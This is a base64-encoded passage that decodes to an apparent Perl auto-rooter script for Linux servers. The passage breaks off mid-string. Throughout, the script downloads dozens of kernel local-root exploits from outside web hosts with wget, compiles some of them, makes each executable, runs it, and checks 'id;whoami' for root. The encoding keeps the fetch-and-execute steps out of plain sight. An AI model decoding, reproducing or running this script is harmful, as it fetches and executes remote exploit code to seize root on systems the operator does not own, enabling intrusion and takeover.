iOw0Kc3lzdGVtKCJ1bmFtZSAtYTtta2RpciBsbng7Y2QgbG54Iik7DQpwcmludCAiWytdIFdhaXQuLlxuIjsNCg0Kc3lzdGVtKCJ3Z2V0IHd3dy50dXgtcGxhbmV0LmZyL3B1YmxpYy9oYWNrL2V4cGxvaXRzL2tlcm5lbC9sb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zLmMiKTsNCnN5c3RlbSgiZ2NjIC1vIGdheXJvcyBsb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zLmMiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGdheXJvcyIpOw0Kc3lzdGVtKCIuL2dheXJvcyIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgd3d3LnR1eC1wbGFuZXQuZnIvcHVibGljL2hhY2svZXhwbG9pdHMva2VybmVsL3Ztc3BsaWNlLWxvY2FsLXJvb3QtZXhwbG9pdC5jIik7DQpzeXN0ZW0oImdjYyAtbyB2bXNwbGljZS1sb2NhbC1yb290LWV4cGxvaXQgdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0LmMiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHZtc3BsaWNlLWxvY2FsLXJvb3QtZXhwbG9pdCIpOw0Kc3lzdGVtKCIuL3Ztc3BsaWNlLWxvY2FsLXJvb3QtZXhwbG9pdCIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290LzIuNi54L3gyIik7DQpzeXN0ZW0oImNobW9kIDc3NyB4MiIpOw0Kc3lzdGVtKCIuL3gyIik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngveCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgeCIpOw0Kc3lzdGVtKCIuL3giKTsNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngvdXNlbGliMjQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHVzZWxpYjI0Iik7DQpzeXN0ZW0oIi4vdXNlbGliMjQiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC8yLjYueC9yb290MiIpOw0Kc3lzdGVtKCJjaG1vZCA3Nzcgcm9vdDIiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCIuL3Jvb3QyIik7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290LzIuNi54L2ttb2QyIik7DQpzeXN0ZW0oImNobW9kIDc3NyBrbW9kMiIpOw0Kc3lzdGVtKCIuL2ttb2QyIik7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3JtY2N1cmR5LmNvbS9zY3JpcHRzL2Rvd25sb2FkZWQvbG9jYWxyb290LzIuNi54L2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgaDAwbHlzaGl0Iik7DQpzeXN0ZW0oIi4vaDAwbHlzaGl0Iik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngvZXhwLnNoIik7DQpzeXN0ZW0oImNobW9kIDc1NSBleHAuc2giKTsNCnN5c3RlbSgic2ggZXhwLnNoIik7DQpzeXN0ZW0oImlkIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngvZWxmbGJsIik7DQpzeXN0ZW0oImNobW9kIDc3NyBlbGZsYmwiKTsNCnN5c3RlbSgiLi9lbGZsYmwiKTsNCnN5c3RlbSgiaWQiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC8yLjYueC9jdzcuMyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgY3c3LjMiKTsNCnN5c3RlbSgiLi9jdzcuMyIpOw0Kc3lzdGVtKCJpZCIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMTgtMzc0LjEyLjEuZWw1LTIwMTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0zNzQuMTIuMS5lbDUtMjAxMiIpOw0Kc3lzdGVtKCIuLzIuNi4xOC0zNzQuMTIuMS5lbDUtMjAxMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4xOC0yNzQtMjAxMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTI3NC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTI3NC0yMDExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMTgtNi14ODYtMjAxMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTYteDg2LTIwMTEiKTsNCnN5c3RlbSgiLi8yLjYuMTgtNi14ODYtMjAxMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3Qvdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyB2bXNwbGljZS1sb2NhbC1yb290LWV4cGxvaXQiKTsNCnN5c3RlbSgiLi92bXNwbGljZS1sb2NhbC1yb290LWV4cGxvaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIwMTEgTG9jYWxSb290IEZvciAyLjYuMTgtMTI4LmVsNSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAxMSBMb2NhbFJvb3QgRm9yIDIuNi4xOC0xMjguZWw1Iik7DQpzeXN0ZW0oIi4vMjAxMSBMb2NhbFJvb3QgRm9yIDIuNi4xOC0xMjguZWw1Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMzMiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zMyIpOw0Kc3lzdGVtKCIuLzIuNi4zMyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjMzLTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zNC0yMDExIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzQtMjAxMSIpOw0Kc3lzdGVtKCIuLzIuNi4zNC0yMDExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMzQtMjAxMUV4cGxvaXQxIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzQtMjAxMUV4cGxvaXQxIik7DQpzeXN0ZW0oIi4vMi42LjM0LTIwMTFFeHBsb2l0MSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjM0LTIwMTFFeHBsb2l0MiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM0LTIwMTFFeHBsb2l0MiIpOw0Kc3lzdGVtKCIuLzIuNi4zNC0yMDExRXhwbG9pdDIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM3Iik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zNy1yYzIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zNy1yYzIiKTsNCnN5c3RlbSgiLi8yLjYuMzctcmMyIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC96MWQtMjAxMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgejFkLTIwMTEiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMjAxMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMS0yIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxLTIiKTsNCnN5c3RlbSgiLi8xLTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEtMyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMS0zIik7DQpzeXN0ZW0oIi4vMS0zIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xLTQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDEtNCIpOw0Kc3lzdGVtKCIuLzEtNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDEwIik7DQpzeXN0ZW0oIi4vMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzExIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxMSIpOw0Kc3lzdGVtKCIuLzExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xMiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMTIiKTsNCnN5c3RlbSgiLi8xMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE0Iik7DQpzeXN0ZW0oIi4vMTQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE1LnNoIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNS5zaCIpOw0Kc3lzdGVtKCIuLzE1LnNoIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xNTE1MCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMTUxNTAiKTsNCnN5c3RlbSgiLi8xNTE1MCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTUyMDAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE1MjAwIik7DQpzeXN0ZW0oIi4vMTUyMDAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE2Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNiIpOw0Kc3lzdGVtKCIuLzE2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xNi0xIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNi0xIik7DQpzeXN0ZW0oIi4vMTYtMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE4Iik7DQpzeXN0ZW0oIi4vMTgiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE4LTUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE4LTUiKTsNCnN5c3RlbSgiLi8xOC01Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyIik7DQpzeXN0ZW0oIi4vMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi0xIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLTEiKTsNCnN5c3RlbSgiLi8yLTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItNi05LTIwMDUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDItNi05LTIwMDUiKTsNCnN5c3RlbSgiLi8yLTYtOS0yMDA1Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLTYtOS0yMDA2Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLTYtOS0yMDA2Iik7DQpzeXN0ZW0oIi4vMi02LTktMjAwNiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi40LjIxLTIwMDYiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDItNi05LTIwMDYiKTsNCnN5c3RlbSgiLi8yLTYtOS0yMDA2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjQuMzYuOTIuNi4yNy41IC0gMjAwOCBMb2NhbCByb290Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjQuMzYuOTIuNi4yNy41IC0gMjAwOCBMb2NhbCByb290Iik7DQpzeXN0ZW0oIi4vMi40LjM2LjkyLjYuMjcuNSAtIDIwMDggTG9jYWwgcm9vdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE2NC0yMDEwIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTgtMTY0LTIwMTAiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMTY0LTIwMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4xOC0xOTQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0xOTQiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMTk0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMTgtMTk0LjEtMjAxMCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTE5NC4xLTIwMTAiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMTk0LjEtMjAxMCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE5NC4yLTIwMTAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0xOTQuMi0yMDEwIik7DQpzeXN0ZW0oIi4vMi42LjE4LTE5NC4yLTIwMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4yLWhvb2x5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjItaG9vbHlzaGl0Iik7DQpzeXN0ZW0oIi4vMi42LjItaG9vbHlzaGl0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMCIpOw0Kc3lzdGVtKCIuLzIuNi4yMCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIwLTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMC0yIik7DQpzeXN0ZW0oIi4vMi42LjIwLTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCg0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjItMjAwOCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIyLTIwMDgiKTsNCnN5c3RlbSgiLi8yLjYuMjItMjAwOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIyLTYtODZfNjQtMjAwNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIyLTYtODZfNjQtMjAwNyIpOw0Kc3lzdGVtKCIuLzIuNi4yMi02LTg2XzY0LTIwMDciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4yMy0yLjYuMjQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMy0yLjYuMjQiKTsNCnN5c3RlbSgiLi8yLjYuMjMtMi42LjI0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjMtMi42LjI0XzIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMy0yLjYuMjRfMiIpOw0Kc3lzdGVtKCIuLzIuNi4yMy0yLjYuMjRfMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIzLTIuNi4yNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIzLTIuNi4yNyIpOw0Kc3lzdGVtKCIuLzIuNi4yMy0yLjYuMjciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4yNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjI0Iik7DQpzeXN0ZW0oIi4vMi42LjI0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjcuNy1nZW5lcmkiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yNy43LWdlbmVyaSIpOw0Kc3lzdGVtKCIuLzIuNi4yNy43LWdlbmVyaSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjI4LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjI4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zMi00Ni4xLkJIc21wIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzItNDYuMS5CSHNtcCIpOw0Kc3lzdGVtKCIuLzIuNi4zMi00Ni4xLkJIc21wIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNV9ob29seXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi41X2hvb2x5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi41X2hvb2x5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjYtMzQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi42LTM0Iik7DQpzeXN0ZW0oIi4vMi42LjYtMzQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi42LTM0X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjYtMzRfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oIi4vMi42LjYtMzRfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNl9oMDBseXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi42X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi42X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjdfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuN19oMDBseXNoaXQiKTsNCnN5c3RlbSgiLi8yLjYuN19oMDBseXNoaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi44LTIwMDguOS02Ny0yMDA4Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOC0yMDA4LjktNjctMjAwOCIpOw0Kc3lzdGVtKCIuLzIuNi44LTIwMDguOS02Ny0yMDA4Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOC01X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjgtNV9oMDBseXNoaXQiKTsNCnN5c3RlbSgiLi8yLjYuOC01X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjhfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOF9oMDBseXNoaXQiKTsNCnN5c3RlbSgiLi8yLjYuOF9oMDBseXNoaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOSIpOw0Kc3lzdGVtKCIuLzIuNi45Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS0yMDA0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS0yMDA0Iik7DQpzeXN0ZW0oIi4vMi42LjktMjAwNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjktMjAwOCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktMjAwOCIpOw0Kc3lzdGVtKCIuLzIuNi45LTIwMDgiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45LTM0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS0zNCIpOw0Kc3lzdGVtKCIuLzIuNi45LTM0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS00Mi4wLjMuRUxzbXAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTQyLjAuMy5FTHNtcCIpOw0Kc3lzdGVtKCIuLzIuNi45LTQyLjAuMy5FTHNtcCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjktNDIuMC4zLkVMc21wLTIwMDYiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTQyLjAuMy5FTHNtcC0yMDA2Iik7DQpzeXN0ZW0oIi4vMi42LjktNDIuMC4zLkVMc21wLTIwMDYiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQoNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45LTU1Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NSIpOw0Kc3lzdGVtKCIuLzIuNi45LTU1Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KDQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS01NS0yMDA3LXBydjgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTU1LTIwMDctcHJ2OCIpOw0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDctcHJ2OCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbH